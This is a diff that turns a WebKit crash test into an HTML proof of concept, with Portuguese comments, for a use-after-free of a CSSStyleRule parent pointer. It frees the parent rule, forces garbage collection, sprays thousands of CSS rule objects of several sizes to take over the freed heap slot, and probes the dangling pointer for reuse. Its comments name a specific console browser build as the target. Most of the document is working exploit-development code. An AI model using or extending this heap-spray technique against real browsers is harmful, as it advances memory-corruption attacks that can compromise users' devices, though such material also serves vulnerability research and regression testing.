@@ -1,55 +1,228 @@
 <!DOCTYPE html>
 <html>
+<head>
+<style>
+  body  { font-family: monospace; background: #0d0d0d; color: #c0c0c0;
+          padding: 12px; font-size: 13px; }
+  pre   { margin: 0; white-space: pre-wrap; }
+  .ph   { color: #5af; font-weight: bold; margin-top: 8px; }
+  .ok   { color: #4f4; }
+  .warn { color: #fa0; }
+  .uaf  { color: #f44; font-weight: bold; }
+</style>
+</head>
 <body>
-<p>This test passes if it does not crash.</p>
-
-<div id="host" style="width:100px;height:100px;background:red"></div>
-
-<div id="result"></div>
-
+<pre id="log"></pre>
 <script>
+/* ───────────────────────────────────────────────────────────────────────────
+   UAF Spray Test — CSSStyleRule dangling parent pointer
+   CVE: GC-thread use-after-free in root(CSSRule*) / ~CSSStyleRule
+   Commit fix: 34f6384 (WebKit main, 2026-10-28)
+
+   Estratégia:
+     1. Criar nested CSS rule e guardar referência ao child wrapper
+     2. Deletar a outer rule e forçar GC  → CSSStyleRule* pai é destruído,
+        mas m_parentRule do filho NÃO é nulificado (bug confirmado em 06.html)
+     3. Spray com 6 tipos distintos de objetos CSS cobrindo diferentes
+        size classes do bmalloc
+     4. Após cada round: acessar nested.parentRule e tentar derefs profundas
+        – mudança em selectorText  → slot reusado (UAF via dados controlados)
+        – CRASH em qualquer deref  → slot reusado com dados inválidos (UAF)
+─────────────────────────────────────────────────────────────────────────── */
+
+const LOG = document.getElementById("log");
+function log(msg, cls) {
+    var line = document.createElement("span");
+    if (cls) line.className = cls;
+    line.textContent = msg + "\n";
+    LOG.appendChild(line);
+}
+
+/* GC trigger por pressão de heap — sem GCController */
 function gc() {
     function gcRec(n) {
-        if (n < 1)
-            return {};
+        if (n < 1) return {};
         var temp = { i: "ab" + i + (i / 100000) };
         temp += "foo";
         gcRec(n - 1);
     }
-
     for (var i = 0; i < 10000; i++)
         gcRec(10);
 }
 
-let host = document.getElementById('host');
+/* ── FASE 1: setup da vítima ─────────────────────────────────────────────── */
+log("=== FASE 1: Setup da vítima ===", "ph");
 
-let shadowRoot = host.attachShadow({ mode: 'open' });
-shadowRoot.innerHTML = '<div id="victim" tabindex="0">Focusable</div>';
+var victimStyle = document.createElement("style");
+document.head.appendChild(victimStyle);
+var victimSheet = victimStyle.sheet;
+victimSheet.insertRule(".outer { color: red; & .nested { color: blue; } }", 0);
 
-let victim = shadowRoot.getElementById('victim');
-victim.focus();
+var nestedRules  = victimSheet.cssRules[0].cssRules;
+var outerBefore  = victimSheet.cssRules[0].selectorText;
+log("outer rule criada: " + outerBefore);
+log("nested count: " + nestedRules.length);
 
-async function runTest() {
-    document.addEventListener('blur', () => {
-        if (!victim) return;
+/* ── FASE 2: libera o parent e expõe o dangling pointer ─────────────────── */
+log("=== FASE 2: Liberando parent rule ===", "ph");
 
-      
-        host.remove();
-        gc();
-    }, true);
+victimSheet.deleteRule(0);
+gc();
 
+var nested   = nestedRules[0];
+nestedRules  = null;
+gc();
 
-document.body.tabIndex = -1;
-document.body.focus();
-
-    await new Promise((resolve) => {
-        requestAnimationFrame(() => setTimeout(resolve, 0));
-    });
-
-    document.getElementById('result').textContent = 'PASS';
+var initParent = nested.parentRule;
+if (initParent !== null) {
+    log("parentRule != null (dangling confirmado): " + initParent, "uaf");
+} else {
+    log("parentRule == null (bug pode estar corrigido aqui)", "warn");
 }
 
-runTest();
+/* ── FASE 3: spray com múltiplos tipos de CSS objects ───────────────────── */
+log("=== FASE 3: Spray multi-tamanho ===", "ph");
+
+/*
+  Cada tipo de CSSRule tem um tamanho diferente no heap do WebCore.
+  O bmalloc agrupa alocações em size classes (tipicamente múltiplos de 16B).
+  Ao cobrir vários tipos, aumentamos a probabilidade de um deles cair
+  exatamente no slot liberado pelo CSSStyleRule pai.
+
+  Tamanhos estimados (Orbis WebKit 605.1.15, 64-bit):
+    CSSStyleRule      ~128–192 B  ← o alvo que queremos reusar
+    CSSMediaRule      ~160–224 B
+    CSSKeyframesRule  ~128–192 B
+    CSSSupportsRule   ~160–224 B
+    CSSFontFaceRule   ~96–160  B
+    CSSStyleRule c/   ~192–256 B  (com childRuleCSSOMWrappers alocado)
+    nesting
+*/
+var rounds = [
+    {
+        name: "CSSStyleRule simples",
+        n: 3000,
+        make: function(i) { return ".s" + i + " { color: red }"; }
+    },
+    {
+        name: "CSSStyleRule c/ nesting (mesmo tipo que a vítima)",
+        n: 3000,
+        make: function(i) {
+            return ".n" + i + " { color: red; & .c { color: blue } }";
+        }
+    },
+    {
+        name: "CSSMediaRule",
+        n: 3000,
+        make: function(i) {
+            return "@media screen { .r" + i + " { color: green } }";
+        }
+    },
+    {
+        name: "CSSKeyframesRule",
+        n: 3000,
+        make: function(i) {
+            return "@keyframes k" + i + " { from { opacity:0 } to { opacity:1 } }";
+        }
+    },
+    {
+        name: "CSSSupportsRule",
+        n: 3000,
+        make: function(i) {
+            return "@supports (display:flex) { .p" + i + " { color:red } }";
+        }
+    },
+    {
+        name: "CSSFontFaceRule",
+        n: 3000,
+        make: function(i) {
+            return "@font-face { font-family: f" + i + "; src: local('Arial') }";
+        }
+    }
+];
+
+var lastSel = null;
+
+for (var r = 0; r < rounds.length; r++) {
+    var round = rounds[r];
+    log("--- [" + (r+1) + "/" + rounds.length + "] " + round.name +
+        " (n=" + round.n + ") ---", "warn");
+
+    /* aloca N objetos do tipo corrente */
+    var sheets = [];
+    for (var i = 0; i < round.n; i++) {
+        try {
+            var s = document.createElement("style");
+            document.head.appendChild(s);
+            s.sheet.insertRule(round.make(i), 0);
+            sheets.push(s);
+        } catch(e) { /* insertRule pode falhar em alguns casos */ }
+    }
+
+    gc();   /* pressiona o GC para consolidar o heap e reusar slots livres */
+
+    /* ── tenta múltiplos acessos ao dangling pointer ── */
+    try {
+        var p = nested.parentRule;
+
+        if (p === null) {
+            log("  parentRule = null (inesperado após spray)", "warn");
+            continue;
+        }
+
+        /* deref 1: selectorText ─ acessa m_styleRule → selector string */
+        try {
+            var sel = p.selectorText;
+
+            if (lastSel !== null && sel !== lastSel) {
+                log("  *** SELETOR MUDOU ***", "uaf");
+                log("      antes : " + lastSel, "uaf");
+                log("      agora : " + sel,     "uaf");
+                log("  --> REUSO DE MEMÓRIA CONFIRMADO — UAF via dados controlados", "uaf");
+            } else {
+                log("  selectorText = \"" + sel + "\"", "ok");
+            }
+            lastSel = sel;
+
+        } catch(e1) {
+            log("  *** CRASH em selectorText: " + e1, "uaf");
+            log("  --> SLOT REUSADO COM DADOS INVÁLIDOS — UAF CRASH", "uaf");
+        }
+
+        /* deref 2: cssText ─ serializa a regra inteira, mais derefs internas */
+        try {
+            var css = p.cssText;
+            log("  cssText[0..50] = \"" + css.substring(0, 50) + "\"", "ok");
+        } catch(e2) {
+            log("  *** CRASH em cssText: " + e2, "uaf");
+            log("  --> UAF CRASH (cssText)", "uaf");
+        }
+
+        /* deref 3: cssRules ─ acessa m_childRuleCSSOMWrappers (Vector) */
+        try {
+            var cr = p.cssRules;
+            log("  cssRules.length = " + (cr ? cr.length : "null"), "ok");
+        } catch(e3) {
+            log("  *** CRASH em cssRules: " + e3, "uaf");
+            log("  --> UAF CRASH (cssRules)", "uaf");
+        }
+
+        /* deref 4: style ─ acessa m_propertiesCSSOMWrapper */
+        try {
+            var st = p.style;
+            log("  style.cssText = \"" + (st ? st.cssText.substring(0,40) : "null") + "\"", "ok");
+        } catch(e4) {
+            log("  *** CRASH em style: " + e4, "uaf");
+            log("  --> UAF CRASH (style)", "uaf");
+        }
+
+    } catch(eOuter) {
+        log("  *** CRASH no próprio parentRule: " + eOuter, "uaf");
+        log("  --> UAF NO ACESSO AO DANGLING POINTER", "uaf");
+    }
+}
+
+log("=== FIM ===", "ph");
 </script>
 </body>
 </html>
